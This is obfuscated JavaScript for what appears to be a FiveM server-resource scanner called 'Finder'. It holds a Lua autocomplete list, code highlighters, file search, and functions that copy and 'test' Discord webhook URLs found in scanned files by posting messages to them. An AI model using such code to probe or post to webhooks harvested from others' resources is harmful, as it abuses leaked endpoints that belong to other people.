      'icon': "fas fa-text-height",
      'category': 'ui'
    }, {
      'text': 'EndTextCommandDisplayText',
      'icon': "fas fa-text-height",
      'category': 'ui'
    }, {
      'text': "SetTextFont",
      'icon': "fas fa-font",
      'category': 'ui'
    }, {
      'text': 'SetTextScale',
      'icon': "fas fa-expand",
      'category': 'ui'
    }, {
      'text': "SetTextColour",
      'icon': "fas fa-palette",
      'category': 'ui'
    }, {
      'text': 'SetTextCentre',
      'icon': "fas fa-align-center",
      'category': 'ui'
    }, {
      'text': "SetTextOutline",
      'icon': "fas fa-border-style",
      'category': 'ui'
    }, {
      'text': "SetTextDropshadow",
      'icon': "fas fa-shadow",
      'category': 'ui'
    }, {
      'text': "SetTextEntry",
      'icon': "fas fa-text-height",
      'category': 'ui'
    }, {
      'text': "DrawText",
      'icon': "fas fa-text-height",
      'category': 'ui'
    }, {
      'text': "AddTextComponentString",
      'icon': "fas fa-text-height",
      'category': 'ui'
    }, {
      'text': 'SetTextComponentFormat',
      'icon': "fas fa-text-height",
      'category': 'ui'
    }, {
      'text': 'DisplayHelpTextThisFrame',
      'icon': "fas fa-question-circle",
      'category': 'ui'
    }, {
      'text': "DisplayOnscreenKeyboard",
      'icon': "fas fa-keyboard",
      'category': 'ui'
    }, {
      'text': "UpdateOnscreenKeyboard",
      'icon': "fas fa-keyboard",
      'category': 'ui'
    }, {
      'text': "GetOnscreenKeyboardResult",
      'icon': "fas fa-keyboard",
      'category': 'ui'
    }, {
      'text': "CloseOnscreenKeyboard",
      'icon': "fas fa-keyboard",
      'category': 'ui'
    }, {
      'text': "SetNuiFocus",
      'icon': "fas fa-mouse-pointer",
      'category': 'ui'
    }, {
      'text': "SendNUIMessage",
      'icon': "fas fa-paper-plane",
      'category': 'ui'
    }, {
      'text': "RegisterNUICallback",
      'icon': "fas fa-exchange-alt",
      'category': 'ui'
    }, {
      'text': "exports",
      'icon': "fas fa-external-link-alt",
      'category': 'export'
    }, {
      'text': "ESX",
      'icon': "fas fa-database",
      'category': 'framework'
    }, {
      'text': "QBCore",
      'icon': "fas fa-database",
      'category': "framework"
    }, {
      'text': "vRP",
      'icon': "fas fa-database",
      'category': "framework"
    }, {
      'text': "MySQL",
      'icon': "fas fa-database",
      'category': "database"
    }, {
      'text': "SQLite",
      'icon': "fas fa-database",
      'category': 'database'
    }, {
      'text': "json.encode",
      'icon': "fas fa-code",
      'category': "utility"
    }, {
      'text': "json.decode",
      'icon': "fas fa-code",
      'category': 'utility'
    }, {
      'text': "string.format",
      'icon': "fas fa-code",
      'category': "utility"
    }, {
      'text': "string.len",
      'icon': "fas fa-code",
      'category': "utility"
    }, {
      'text': 'string.sub',
      'icon': "fas fa-code",
      'category': "utility"
    }, {
      'text': "table.insert",
      'icon': "fas fa-list",
      'category': "utility"
    }, {
      'text': "table.remove",
      'icon': "fas fa-list",
      'category': "utility"
    }, {
      'text': "table.concat",
      'icon': "fas fa-list",
      'category': "utility"
    }, {
      'text': "pairs",
      'icon': "fas fa-code",
      'category': "utility"
    }, {
      'text': 'ipairs',
      'icon': "fas fa-code",
      'category': "utility"
    }, {
      'text': "tonumber",
      'icon': "fas fa-code",
      'category': "utility"
    }, {
      'text': "tostring",
      'icon': "fas fa-code",
      'category': 'utility'
    }, {
      'text': "type",
      'icon': "fas fa-code",
      'category': "utility"
    }, {
      'text': "print",
      'icon': "fas fa-terminal",
      'category': "utility"
    }, {
      'text': "math.random",
      'icon': "fas fa-dice",
      'category': "utility"
    }, {
      'text': 'math.floor',
      'icon': "fas fa-code",
      'category': "utility"
    }, {
      'text': "math.ceil",
      'icon': "fas fa-code",
      'category': "utility"
    }, {
      'text': "math.abs",
      'icon': "fas fa-code",
      'category': "utility"
    }, {
      'text': 'os.time',
      'icon': "fas fa-clock",
      'category': "utility"
    }, {
      'text': "os.date",
      'icon': "fas fa-calendar",
      'category': "utility"
    }];
    function _0x5f3f4a(_0x24941a) {
      if (_0x24941a.length === 0x0) {
        _0x348777();
        return;
      }
      _0x3397ed = _0x24941a;
      _0x7b5879 = 0x0;
      _0x246d1b = true;
      _0x224ce9.innerHTML = '';
      _0x24941a.forEach((_0x5d550b, _0x45af2e) => {
        const _0x1feac5 = document.createElement("div");
        _0x1feac5.className = "suggestion-item";
        _0x1feac5.setAttribute("data-suggestion", _0x5d550b.text);
        _0x1feac5.innerHTML = "\n                    <i class=\"" + _0x5d550b.icon + "\"></i>\n                    <span>" + _0x5d550b.text + "</span>\n                ";
        if (_0x45af2e === 0x0) {
          _0x1feac5.classList.add("selected");
        }
        _0x1feac5.addEventListener("click", () => {
          _0x5614fe(_0x5d550b.text);
        });
        _0x224ce9.appendChild(_0x1feac5);
      });
      _0x59be54();
      _0x224ce9.style.display = "block";
    }
    function _0x59be54() {
      const _0x4551f5 = document.getElementById("editor-trigger-text");
      const _0x139af6 = _0x4551f5.selectionStart;
      const _0x41ca0d = _0x4551f5.value.substring(0x0, _0x139af6);
      const _0x3c2e0b = document.createElement('div');
      _0x3c2e0b.style.cssText = "\n                position: absolute;\n                visibility: hidden;\n                white-space: pre-wrap;\n                word-wrap: break-word;\n                font-family: 'Courier New', monospace;\n                font-size: 12px;\n                line-height: 1.4;\n                padding: 15px;\n                width: " + _0x4551f5.offsetWidth + "px;\n            ";
      _0x3c2e0b.textContent = _0x41ca0d;
      document.body.appendChild(_0x3c2e0b);
      const _0x5b2313 = getComputedStyle(_0x4551f5);
      const _0x2a74f6 = parseFloat(_0x5b2313.lineHeight);
      const _0x1d4436 = parseFloat(_0x5b2313.paddingTop);
      const _0x12312d = parseFloat(_0x5b2313.paddingLeft);
      const _0x342375 = _0x41ca0d.split("\n");
      const _0x257a8e = _0x342375[_0x342375.length - 0x1];
      const _0x24fc0e = _0x342375.length - 0x1;
      const _0x567487 = _0x1d4436 + _0x24fc0e * _0x2a74f6 + _0x2a74f6 + 0x2;
      const _0x4d4ae9 = document.createElement("div");
      _0x4d4ae9.style.cssText = "\n                position: absolute;\n                visibility: hidden;\n                white-space: pre;\n                font-family: 'Courier New', monospace;\n                font-size: 12px;\n                line-height: 1.4;\n            ";
      _0x4d4ae9.textContent = _0x257a8e;
      document.body.appendChild(_0x4d4ae9);
      const _0x3037cd = _0x4d4ae9.offsetWidth;
      const _0x437e43 = _0x12312d + _0x3037cd;
      document.body.removeChild(_0x3c2e0b);
      document.body.removeChild(_0x4d4ae9);
      _0x224ce9.style.top = _0x567487 + 'px';
      _0x224ce9.style.left = _0x437e43 + 'px';
      _0x224ce9.style.width = "auto";
      _0x224ce9.style.minWidth = "200px";
    }
    function _0x348777() {
      _0x224ce9.style.display = 'none';
      _0x246d1b = false;
      _0x3397ed = [];
      _0x7b5879 = 0x0;
    }
    function _0x5614fe(_0x324177) {
      const _0x456517 = _0x4f9a72.selectionStart;
      const _0x1c687f = _0x4f9a72.value.substring(0x0, _0x456517);
      const _0x4cf5f2 = _0x4f9a72.value.substring(_0x456517);
      const _0x17b141 = _0x1c687f.split(/\s/);
      const _0x543651 = _0x17b141[_0x17b141.length - 0x1];
      const _0x43cf82 = _0x1c687f.substring(0x0, _0x1c687f.length - _0x543651.length) + _0x324177 + _0x4cf5f2;
      _0x4f9a72.value = _0x43cf82;
      const _0x3ed975 = _0x456517 - _0x543651.length + _0x324177.length;
      _0x4f9a72.setSelectionRange(_0x3ed975, _0x3ed975);
      _0x4f9a72.focus();
      _0x348777();
    }
    function _0x5ca9ec() {
      const _0x419d19 = _0x4f9a72.selectionStart;
      const _0x5938e8 = _0x4f9a72.value.substring(0x0, _0x419d19);
      const _0x308f56 = _0x5938e8.split(/\s/);
      return _0x308f56[_0x308f56.length - 0x1];
    }
    function _0xbddde9(_0x4e6ada) {
      if (_0x4e6ada.length < 0x2) {
        return [];
      }
      return _0x163b5c.filter(_0xccaec6 => _0xccaec6.text.toLowerCase().includes(_0x4e6ada.toLowerCase()));
    }
    _0x4f9a72.addEventListener("input", _0x13ba06 => {
      const _0x4fe5af = _0x5ca9ec();
      const _0x564d52 = _0xbddde9(_0x4fe5af);
      if (_0x564d52.length > 0x0) {
        _0x5f3f4a(_0x564d52);
      } else {
        _0x348777();
      }
    });
    _0x4f9a72.addEventListener("keyup", _0x1fc16f => {
      if (_0x246d1b) {
        _0x59be54();
      }
    });
    _0x4f9a72.addEventListener("scroll", () => {
      if (_0x246d1b) {
        _0x59be54();
      }
    });
    _0x4f9a72.addEventListener("keydown", _0x1e584a => {
      if (!_0x246d1b) {
        return;
      }
      switch (_0x1e584a.key) {
        case "ArrowDown":
          _0x1e584a.preventDefault();
          _0x7b5879 = (_0x7b5879 + 0x1) % _0x3397ed.length;
          _0x349cdb();
          break;
        case "ArrowUp":
          _0x1e584a.preventDefault();
          _0x7b5879 = _0x7b5879 === 0x0 ? _0x3397ed.length - 0x1 : _0x7b5879 - 0x1;
          _0x349cdb();
          break;
        case 'Enter':
          if (_0x246d1b) {
            _0x1e584a.preventDefault();
            if (_0x3397ed[_0x7b5879]) {
              _0x5614fe(_0x3397ed[_0x7b5879].text);
            }
          }
          break;
        case "Escape":
          _0x348777();
          break;
        case 'Tab':
          if (_0x246d1b) {
            _0x1e584a.preventDefault();
            if (_0x3397ed[_0x7b5879]) {
              _0x5614fe(_0x3397ed[_0x7b5879].text);
            }
          }
          break;
      }
    });
    function _0x349cdb() {
      const _0x1325b7 = _0x224ce9.querySelectorAll(".suggestion-item");
      _0x1325b7.forEach((_0x16519c, _0x3379f5) => {
        if (_0x3379f5 === _0x7b5879) {
          _0x16519c.classList.add("selected");
        } else {
          _0x16519c.classList.remove("selected");
        }
      });
    }
    document.addEventListener("click", _0x8c1c47 => {
      if (!_0x4f9a72.contains(_0x8c1c47.target) && !_0x224ce9.contains(_0x8c1c47.target)) {
        _0x348777();
      }
    });
    _0x4f9a72.addEventListener("blur", () => {
      setTimeout(() => {
        if (!_0x224ce9.contains(document.activeElement)) {
          _0x348777();
        }
      }, 0x64);
    });
    console.log("Editor auto-completion setup complete");
  } catch (_0xccb036) {
    console.error("Error setting up editor auto-completion:", _0xccb036);
  }
}
function highlightLua(_0x27453b) {
  return _0x27453b.replace(/\b(local|function|if|then|else|elseif|end|for|do|while|repeat|until|in|and|or|not|true|false|nil|return|break)\b/g, "<span class=\"lua-keyword\">$1</span>").replace(/(--.*$)/gm, "<span class=\"lua-comment\">$1</span>").replace(/(["'])((?:(?!\1)[^\\]|\\.)*\1)/g, "<span class=\"lua-string\">$1$2$1</span>").replace(/\b(\d+\.?\d*)\b/g, "<span class=\"lua-number\">$1</span>");
}
function highlightJavaScript(_0x1483f2) {
  return _0x1483f2.replace(/\b(function|var|let|const|if|else|for|while|do|switch|case|break|continue|return|try|catch|finally|throw|new|delete|typeof|instanceof|in|of|class|extends|super|import|export|default|async|await|yield|get|set|static|public|private|protected|interface|enum|namespace|module|require|exports|console|document|window|Math|Date|Array|Object|String|Number|Boolean|RegExp|Error|Promise|Map|Set|WeakMap|WeakSet|Symbol|Proxy|Reflect|JSON|parse|stringify|log|warn|error|info|debug|assert|clear|count|countReset|dir|dirxml|group|groupCollapsed|groupEnd|profile|profileEnd|table|time|timeEnd|timeLog|timeStamp|trace)\b/g, "<span class=\"js-keyword\">$1</span>").replace(/(\/\/.*$)/gm, "<span class=\"js-comment\">$1</span>").replace(/(\/\*[\s\S]*?\*\/)/g, "<span class=\"js-comment\">$1</span>").replace(/(["'`])((?:(?!\1)[^\\]|\\.)*\1)/g, "<span class=\"js-string\">$1$2$1</span>").replace(/\b(\d+\.?\d*)\b/g, "<span class=\"js-number\">$1</span>");
}
function highlightXML(_0x2e5b35) {
  return _0x2e5b35.replace(/(&lt;\/?)([a-zA-Z][a-zA-Z0-9]*)([^&]*?)(&gt;)/g, "<span class=\"xml-tag\">$1$2$3$4</span>").replace(/([a-zA-Z][a-zA-Z0-9]*)=/g, "<span class=\"xml-attr\">$1</span>=").replace(/(["'])((?:(?!\1)[^\\]|\\.)*\1)/g, "<span class=\"xml-value\">$1$2$1</span>").replace(/(&lt;!--[\s\S]*?--&gt;)/g, "<span class=\"xml-comment\">$1</span>");
}
function highlightJSON(_0x3ae5be) {
  return _0x3ae5be.replace(/(["'])((?:(?!\1)[^\\]|\\.)*\1)/g, "<span class=\"js-string\">$1$2$1</span>").replace(/\b(true|false|null)\b/g, "<span class=\"js-keyword\">$1</span>").replace(/\b(\d+\.?\d*)\b/g, "<span class=\"js-number\">$1</span>");
}
function highlightHTML(_0x15c956) {
  return _0x15c956.replace(/(&lt;\/?)([a-zA-Z][a-zA-Z0-9]*)([^&]*?)(&gt;)/g, "<span class=\"xml-tag\">$1$2$3$4</span>").replace(/([a-zA-Z][a-zA-Z0-9]*)=/g, "<span class=\"xml-attr\">$1</span>=").replace(/(["'])((?:(?!\1)[^\\]|\\.)*\1)/g, "<span class=\"xml-value\">$1$2$1</span>").replace(/(&lt;!--[\s\S]*?--&gt;)/g, "<span class=\"xml-comment\">$1</span>");
}
function highlightCSS(_0x4f1c0c) {
  return _0x4f1c0c.replace(/([a-zA-Z-]+)(?=\s*:)/g, "<span class=\"css-property\">$1</span>").replace(/(["'])((?:(?!\1)[^\\]|\\.)*\1)/g, "<span class=\"css-string\">$1$2$1</span>").replace(/\b(\d+\.?\d*)(px|em|rem|%|vh|vw|pt|pc|in|cm|mm)?\b/g, "<span class=\"css-number\">$1$2</span>").replace(/(\/\*[\s\S]*?\*\/)/g, "<span class=\"css-comment\">$1</span>");
}
function highlightPHP(_0x3d54a0) {
  return _0x3d54a0.replace(/\b(function|class|interface|trait|namespace|use|as|extends|implements|public|private|protected|static|abstract|final|const|var|global|static|echo|print|return|if|else|elseif|endif|for|foreach|while|do|switch|case|break|continue|goto|try|catch|finally|throw|new|clone|unset|isset|empty|die|exit|include|include_once|require|require_once|__construct|__destruct|__call|__callStatic|__get|__set|__isset|__unset|__sleep|__wakeup|__toString|__invoke|__set_state|__clone|__debugInfo|__halt_compiler|array|callable|string|int|float|bool|true|false|null|self|parent|__CLASS__|__DIR__|__FILE__|__FUNCTION__|__LINE__|__METHOD__|__NAMESPACE__|__TRAIT__)\b/g, "<span class=\"php-keyword\">$1</span>").replace(/(\/\/.*$)/gm, "<span class=\"php-comment\">$1</span>").replace(/(\/\*[\s\S]*?\*\/)/g, "<span class=\"php-comment\">$1</span>").replace(/(["'])((?:(?!\1)[^\\]|\\.)*\1)/g, "<span class=\"php-string\">$1$2$1</span>").replace(/\b(\d+\.?\d*)\b/g, "<span class=\"php-number\">$1</span>").replace(/(\$\w+)/g, "<span class=\"php-variable\">$1</span>");
}
function highlightPython(_0x398039) {
  return _0x398039.replace(/\b(def|class|if|elif|else|for|while|try|except|finally|with|as|import|from|return|break|continue|pass|raise|assert|del|global|nonlocal|lambda|and|or|not|is|in|True|False|None|self|super|__init__|__str__|__repr__|__len__|__getitem__|__setitem__|__delitem__|__iter__|__next__|__enter__|__exit__|print|len|range|list|dict|set|tuple|str|int|float|bool|type|isinstance|issubclass|hasattr|getattr|setattr|delattr|dir|vars|locals|globals|help|id|hash|open|file|input|raw_input|exec|eval|compile|execfile|reload|__import__|abs|all|any|bin|bool|bytearray|bytes|callable|chr|classmethod|complex|delattr|dict|dir|divmod|enumerate|filter|float|format|frozenset|getattr|globals|hasattr|hash|help|hex|id|input|int|isinstance|issubclass|iter|len|list|locals|map|max|memoryview|min|next|object|oct|open|ord|pow|print|property|range|repr|reversed|round|set|setattr|slice|sorted|staticmethod|str|sum|super|tuple|type|vars|zip)\b/g, "<span class=\"py-keyword\">$1</span>").replace(/(#.*$)/gm, "<span class=\"py-comment\">$1</span>").replace(/(["'`])((?:(?!\1)[^\\]|\\.)*\1)/g, "<span class=\"py-string\">$1$2$1</span>").replace(/\b(\d+\.?\d*)\b/g, "<span class=\"py-number\">$1</span>");
}
function escapeHtml(_0x5c8072) {
  const _0x530e61 = document.createElement("div");
  _0x530e61.textContent = _0x5c8072;
  return _0x530e61.innerHTML;
}
function setupFileViewerSearch(_0x349ae3) {
  try {
    const _0x11a965 = _0x349ae3.querySelector('#file-viewer-search-input');
    const _0x376bb1 = _0x349ae3.querySelector("#file-viewer-search-prev");
    const _0x118a3c = _0x349ae3.querySelector("#file-viewer-search-next");
    const _0xffb17 = _0x349ae3.querySelector("#file-viewer-search-count");
    const _0x2a1d5c = _0x349ae3.querySelector("#file-viewer-text");
    let _0x49cfe2 = [];
    let _0x39e705 = -0x1;
    let _0x29dbd7 = '';
    const _0x363da2 = new MutationObserver(() => {
      _0x29dbd7 = _0x2a1d5c.textContent || '';
    });
    _0x363da2.observe(_0x2a1d5c, {
      'childList': true,
      'subtree': true
    });
    _0x29dbd7 = _0x2a1d5c.textContent || '';
    function _0x18d139(_0x49a3cc) {
      if (!_0x49a3cc.trim()) {
        _0x34e8d2();
        return;
      }
      _0x49cfe2 = [];
      _0x39e705 = -0x1;
      const _0xdaa091 = _0x29dbd7;
      const _0x520a8b = new RegExp(_0x49a3cc.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), 'gi');
      let _0xa5cc44;
      while ((_0xa5cc44 = _0x520a8b.exec(_0xdaa091)) !== null) {
        _0x49cfe2.push({
          'start': _0xa5cc44.index,
          'end': _0xa5cc44.index + _0xa5cc44[0x0].length,
          'text': _0xa5cc44[0x0]
        });
      }
      if (_0x49cfe2.length > 0x0) {
        _0x39e705 = 0x0;
        _0x4c736b();
      }
      _0x4fc0ce();
    }
    function _0x4c736b() {
      if (_0x49cfe2.length === 0x0 || _0x39e705 < 0x0) {
        return;
      }
      const _0x4fbdaa = _0x29dbd7.split('').map((_0x1c5f13, _0x42823b) => {
        const _0x536207 = _0x49cfe2.some(_0x41b98f => _0x42823b >= _0x41b98f.start && _0x42823b < _0x41b98f.end);
        const _0x496906 = _0x49cfe2[_0x39e705] && _0x42823b >= _0x49cfe2[_0x39e705].start && _0x42823b < _0x49cfe2[_0x39e705].end;
        if (_0x496906) {
          return "<span class=\"search-current\">" + escapeHtml(_0x1c5f13) + '</span>';
        } else {
          return _0x536207 ? "<span class=\"search-match\">" + escapeHtml(_0x1c5f13) + "</span>" : escapeHtml(_0x1c5f13);
        }
      }).join('');
      const _0x43e031 = document.getElementById("file-viewer-name").textContent.replace("File Preview: ", '');
      const _0x16e97d = applySyntaxHighlighting(_0x4fbdaa, _0x43e031);
      _0x2a1d5c.innerHTML = '<code>' + _0x16e97d + "</code>";
      const _0x5f3632 = _0x49cfe2[_0x39e705];
      if (_0x5f3632) {
        _0x46d88f(_0x5f3632);
      }
    }
    function _0x46d88f(_0x29e95e) {
      const _0x2a295f = _0x29dbd7.substring(0x0, _0x29e95e.start);
      const _0x419d5c = _0x2a295f.split("\n").length - 0x1;
      const _0x3f4bc9 = _0x419d5c * 0x14;
      _0x2a1d5c.scrollTop = Math.max(0x0, _0x3f4bc9 - 0x64);
    }
    function _0x4fc0ce() {
      if (_0x49cfe2.length === 0x0) {
        _0xffb17.textContent = "No matches";
        _0xffb17.className = "no-matches";
        _0x376bb1.disabled = true;
        _0x118a3c.disabled = true;
      } else {
        _0xffb17.textContent = _0x39e705 + 0x1 + " of " + _0x49cfe2.length;
        _0xffb17.className = "has-matches";
        _0x376bb1.disabled = false;
        _0x118a3c.disabled = false;
      }
    }
    function _0x34e8d2() {
      _0x49cfe2 = [];
      _0x39e705 = -0x1;
      const _0x4176a8 = document.getElementById("file-viewer-name").textContent.replace("File Preview: ", '');
      const _0x4119b4 = applySyntaxHighlighting(_0x29dbd7, _0x4176a8);
      _0x2a1d5c.innerHTML = "<code>" + _0x4119b4 + "</code>";
      _0x4fc0ce();
    }
    _0x11a965.addEventListener('input', _0x32f6e7 => {
      _0x18d139(_0x32f6e7.target.value);
    });
    _0x376bb1.addEventListener('click', () => {
      if (_0x49cfe2.length > 0x0) {
        _0x39e705 = _0x39e705 <= 0x0 ? _0x49cfe2.length - 0x1 : _0x39e705 - 0x1;
        _0x4c736b();
        _0x4fc0ce();
      }
    });
    _0x118a3c.addEventListener("click", () => {
      if (_0x49cfe2.length > 0x0) {
        _0x39e705 = _0x39e705 >= _0x49cfe2.length - 0x1 ? 0x0 : _0x39e705 + 0x1;
        _0x4c736b();
        _0x4fc0ce();
      }
    });
    _0x11a965.addEventListener("keydown", _0x56635b => {
      if (_0x56635b.key === "Enter") {
        _0x56635b.preventDefault();
        if (_0x56635b.shiftKey) {
          _0x376bb1.click();
        } else {
          _0x118a3c.click();
        }
      }
    });
    _0x4fc0ce();
  } catch (_0x5a3b58) {
    console.error("Error setting up file viewer search:", _0x5a3b58);
  }
}
function setupFileSearch(_0x2f5b34) {
  const _0x583b01 = _0x2f5b34.querySelector("#file-search-input");
  const _0x2cfd03 = _0x2f5b34.querySelector("#search-prev");
  const _0x48fadc = _0x2f5b34.querySelector("#search-next");
  const _0x59cfa6 = _0x2f5b34.querySelector('#search-count');
  const _0x2add2f = _0x2f5b34.querySelector("#preview-code");
  let _0x3b7c03 = [];
  let _0x54c355 = -0x1;
  let _0xbf201f = '';
  const _0x4bdc2b = new MutationObserver(_0x1f1d3d => {
    _0x1f1d3d.forEach(_0x2406e2 => {
      if (_0x2406e2.type === "childList" && _0x2406e2.target === _0x2add2f) {
        _0xbf201f = _0x2add2f.innerHTML;
        _0x4bdc2b.disconnect();
      }
    });
  });
  _0x4bdc2b.observe(_0x2add2f, {
    'childList': true
  });
  _0x583b01.addEventListener("input", _0x201a66 => {
    const _0x5cad34 = _0x201a66.target.value.trim();
    if (_0x5cad34.length === 0x0) {
      _0x26c510();
      return;
    }
    _0x5e11f6(_0x5cad34);
  });
  _0x2cfd03.addEventListener("click", () => {
    if (_0x3b7c03.length > 0x0) {
      _0x54c355 = _0x54c355 <= 0x0 ? _0x3b7c03.length - 0x1 : _0x54c355 - 0x1;
      _0x1d646f();
    }
  });
  _0x48fadc.addEventListener('click', () => {
    if (_0x3b7c03.length > 0x0) {
      _0x54c355 = _0x54c355 >= _0x3b7c03.length - 0x1 ? 0x0 : _0x54c355 + 0x1;
      _0x1d646f();
    }
  });
  _0x583b01.addEventListener("keydown", _0x4b8aea => {
    if (_0x4b8aea.key === "Enter") {
      _0x4b8aea.preventDefault();
      if (_0x4b8aea.shiftKey) {
        _0x2cfd03.click();
      } else {
        _0x48fadc.click();
      }
    } else if (_0x4b8aea.key === "Escape") {
      _0x26c510();
      _0x583b01.blur();
    }
  });
  function _0x5e11f6(_0x39f2dc) {
    if (!_0xbf201f) {
      return;
    }
    _0x3b7c03 = [];
    _0x54c355 = -0x1;
    const _0xf04756 = document.createElement('div');
    _0xf04756.innerHTML = _0xbf201f;
    const _0x4cd862 = document.createTreeWalker(_0xf04756, NodeFilter.SHOW_TEXT, null, false);
    const _0x4a837c = [];
    let _0xefcd59;
    while (_0xefcd59 = _0x4cd862.nextNode()) {
      _0x4a837c.push(_0xefcd59);
    }
    _0x4a837c.forEach(_0x10db0b => {
      const _0x217d87 = _0x10db0b.textContent;
      const _0x4107f9 = new RegExp(_0x39f2dc.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), 'gi');
      let _0x39b95c;
      while ((_0x39b95c = _0x4107f9.exec(_0x217d87)) !== null) {
        _0x3b7c03.push({
          'node': _0x10db0b,
          'start': _0x39b95c.index,
          'end': _0x39b95c.index + _0x39b95c[0x0].length,
          'text': _0x39b95c[0x0]
        });
      }
    });
    _0x44bfc3();
    if (_0x3b7c03.length > 0x0) {
      _0x54c355 = 0x0;
      _0x1d646f();
    }
  }
  function _0x1d646f() {
    if (_0x54c355 < 0x0 || _0x54c355 >= _0x3b7c03.length) {
      return;
    }
    _0x2add2f.innerHTML = _0xbf201f;
    _0x3b7c03.forEach((_0x26ad82, _0x5e0e61) => {
      const _0x42ebad = _0x5e0e61 === _0x54c355;
      _0x555f2c(_0x26ad82, _0x42ebad);
    });
    const _0x47183c = _0x3b7c03[_0x54c355];
    if (_0x47183c) {
      _0x3ee2ae(_0x47183c);
    }
  }
  function _0x555f2c(_0x31c10a, _0xb1980) {
    const _0x3c4e27 = document.createElement("div");
    _0x3c4e27.innerHTML = _0x2add2f.innerHTML;
    const _0xdcf294 = document.createTreeWalker(_0x3c4e27, NodeFilter.SHOW_TEXT, null, false);
    const _0x23ce45 = [];
    let _0x46150c;
    while (_0x46150c = _0xdcf294.nextNode()) {
      _0x23ce45.push(_0x46150c);
    }
    const _0x246904 = _0x23ce45.find(_0x2bce77 => _0x2bce77.textContent === _0x31c10a.node.textContent);
    if (_0x246904) {
      const _0x2d1783 = _0x246904.textContent;
      const _0x21f01d = _0x2d1783.substring(0x0, _0x31c10a.start);
      const _0x2047b8 = _0x2d1783.substring(_0x31c10a.start, _0x31c10a.end);
      const _0x5b41af = _0x2d1783.substring(_0x31c10a.end);
      const _0x116475 = document.createElement("span");
      _0x116475.innerHTML = escapeHtml(_0x21f01d) + ("<span class=\"search-match " + (_0xb1980 ? "search-current" : '') + "\">" + escapeHtml(_0x2047b8) + "</span>") + escapeHtml(_0x5b41af);
      _0x246904.parentNode.replaceChild(_0x116475, _0x246904);
    }
    _0x2add2f.innerHTML = _0x3c4e27.innerHTML;
  }
  function _0x3ee2ae(_0x2968a3) {
    const _0x360cc3 = _0x2add2f.querySelectorAll(".search-current");
    if (_0x360cc3.length > 0x0) {
      _0x360cc3[0x0].scrollIntoView({
        'behavior': "smooth",
        'block': "center"
      });
    }
  }
  function _0x44bfc3() {
    if (_0x3b7c03.length === 0x0) {
      _0x59cfa6.textContent = "No matches";
      _0x59cfa6.className = "search-count no-matches";
    } else {
      _0x59cfa6.textContent = _0x54c355 + 0x1 + " of " + _0x3b7c03.length;
      _0x59cfa6.className = "search-count has-matches";
    }
    _0x2cfd03.disabled = _0x3b7c03.length === 0x0;
    _0x48fadc.disabled = _0x3b7c03.length === 0x0;
  }
  function _0x26c510() {
    _0x3b7c03 = [];
    _0x54c355 = -0x1;
    _0x2add2f.innerHTML = _0xbf201f;
    _0x59cfa6.textContent = '';
    _0x59cfa6.className = '';
    _0x2cfd03.disabled = true;
    _0x48fadc.disabled = true;
  }
}
function copyWebhook(_0x275924) {
  try {
    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(_0x275924);
      showNotification("Webhook URL copied to clipboard", 'success');
    } else {
      const _0x9bbf04 = document.createElement("textarea");
      _0x9bbf04.value = _0x275924;
      _0x9bbf04.style.position = 'fixed';
      _0x9bbf04.style.left = "-999999px";
      _0x9bbf04.style.top = "-999999px";
      document.body.appendChild(_0x9bbf04);
      _0x9bbf04.focus();
      _0x9bbf04.select();
      try {
        document.execCommand('copy');
        showNotification("Webhook URL copied to clipboard", "success");
      } catch (_0x4289a4) {
        showNotification("Please copy manually: " + _0x275924, "warning");
      }
      document.body.removeChild(_0x9bbf04);
    }
  } catch (_0x58bfeb) {
    console.error("Error copying webhook:", _0x58bfeb);
    showNotification("Error copying webhook", "error");
  }
}
async function testWebhook(_0x465b28) {
  try {
    showNotification("Testing webhook: " + _0x465b28.substring(0x0, 0x1e) + "...", "info");
    webhookStatusCache["delete"](_0x465b28);
    const _0x179c24 = await validateWebhookStatus(_0x465b28);
    return _0x179c24 === "Active" ? (showNotification("â Webhook test successful! Message sent to Discord.", "success"), true) : (showNotification("â Webhook test failed: Webhook appears to be inactive", "error"), false);
  } catch (_0x34eca2) {
    console.error("Error testing webhook:", _0x34eca2);
    showNotification("â Webhook test failed: " + _0x34eca2.message, "error");
    return false;
  }
}
const webhookStatusCache = new Map();
async function validateWebhookStatus(_0x56d353) {
  try {
    if (webhookStatusCache.has(_0x56d353)) {
      return webhookStatusCache.get(_0x56d353);
    }
    if (!_0x56d353.startsWith('https://discord.com/api/webhooks/') && !_0x56d353.startsWith('https://canary.discord.com/api/webhooks/') && !_0x56d353.startsWith("https://discordapp.com/api/webhooks/")) {
      webhookStatusCache.set(_0x56d353, "Invalid");
      return "Invalid";
    }
    const _0x17bbd6 = _0x56d353.split('/');
    const _0x41dd1b = _0x17bbd6[_0x17bbd6.length - 0x2];
    const _0x1e8533 = _0x17bbd6[_0x17bbd6.length - 0x1];
    if (!_0x41dd1b || !_0x1e8533) {
      webhookStatusCache.set(_0x56d353, 'Invalid');
      return "Invalid";
    }
    const _0x1b76d1 = {
      'content': "đ Test - " + new Date().toLocaleTimeString(),
      'username': 'Finder'
    };
    const _0x4edfa0 = await fetch(_0x56d353, {
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      },
      'body': JSON.stringify(_0x1b76d1)
    });
    const _0x329cee = _0x4edfa0.ok ? 'Active' : "Invalid";
    webhookStatusCache.set(_0x56d353, _0x329cee);
    return _0x329cee;
  } catch (_0x3c1caa) {
    console.error("Error validating webhook status:", _0x3c1caa);
    webhookStatusCache.set(_0x56d353, 'Invalid');
    return "Invalid";
  }
}
function openWebhookPreview(_0x5f51b7, _0x212753, _0x399985, _0x3b10f8) {
  try {
    const _0x4d7962 = appState.scanResults.webhooks.find(_0x3b60d9 => _0x3b60d9.url === _0x5f51b7);
    if (_0x4d7962 && _0x4d7962.file) {
      openTriggerPreview(_0x212753 || "unknown", _0x4d7962.file, _0x4d7962.line || 0x1);
    } else {
      const _0x3e4464 = document.createElement("div");
      _0x3e4464.className = "file-viewer-modal";
      _0x3e4464.style.zIndex = "10000";
      const _0x42f1ea = document.createElement('div');
      _0x42f1ea.className = 'file-viewer-overlay';
      const _0x53331c = document.createElement("div");
      _0x53331c.className = "file-viewer-window";
